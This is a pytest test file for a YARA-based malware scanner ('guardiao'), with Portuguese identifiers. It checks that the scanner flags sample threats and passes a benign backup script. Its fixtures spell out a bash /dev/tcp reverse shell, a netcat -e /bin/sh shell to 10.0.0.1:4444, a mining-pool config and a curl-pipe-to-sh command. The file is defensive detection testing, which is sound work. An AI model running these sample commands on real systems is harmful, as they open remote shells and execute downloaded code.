import pytest

pytest.importorskip("yara_x")

from guardiao import regras_yara, scanner

# Amostras montadas em pedaços ("a" "b") para este arquivo de teste
# não ser, ele mesmo, detectado ao varrer o projeto.
REVERSE_SHELL = "#!/bin/bash\nbash -i >& /dev/" "tcp/10.0.0.1/4444 0>&1\n"
NETCAT = "nc 10.0.0.1 4444 -e /bin/" "sh\n"
MINERADOR = '{"url": "stratum+' 'tcp://pool.exemplo.com:3333", "user": "carteira"}'
CURL_SH = "curl -fsSL https://exemplo.com/install.sh |" " sh\n"


@pytest.fixture(scope="module")
def yara():
    return regras_yara.carregar()


def analisar(tmp_path, nome, conteudo, yara):
    arquivo = tmp_path / nome
    if isinstance(conteudo, bytes):
        arquivo.write_bytes(conteudo)
    else:
        arquivo.write_text(conteudo)
    return scanner.analisar(arquivo, {}, yara)


def test_reverse_shell_e_ameaca(tmp_path, yara):
    r = analisar(tmp_path, "atualizar.sh", REVERSE_SHELL, yara)
    assert r.ameaca == "ReverseShell_DevTcp (YARA)"


def test_netcat_e_ameaca(tmp_path, yara):
    r = analisar(tmp_path, "run.sh", NETCAT, yara)
    assert r.ameaca == "ReverseShell_Netcat (YARA)"


def test_minerador_e_ameaca(tmp_path, yara):
    r = analisar(tmp_path, "config.json", MINERADOR, yara)
    assert r.ameaca == "MineradorCripto (YARA)"


def test_curl_pipe_sh_e_suspeito(tmp_path, yara):
    r = analisar(tmp_path, "setup.sh", CURL_SH, yara)
    assert not r.infectado and r.suspeito
    assert any("DownloadEExecuta" in m for m in r.motivos)


def test_elf_upx_e_suspeito(tmp_path, yara):
    r = analisar(tmp_path, "programa", b"\x7fELF" + b"\x00" * 100 + b"UPX!" + b"\x00" * 100, yara)
    assert r.suspeito
    assert any("ELF_EmpacotadoUPX" in m for m in r.motivos)


def test_script_comum_passa_limpo(tmp_path, yara):
    r = analisar(tmp_path, "backup.sh", "#!/bin/bash\ntar czf backup.tgz ~/docs\necho pronto\n", yara)
    assert not r.infectado and not r.suspeito


def test_nao_detecta_as_proprias_regras(yara):
    resultados = list(scanner.varrer(regras_yara.PASTA_PADRAO.parent, {}, yara))
    assert not any(getattr(r, "infectado", False) for r in resultados)
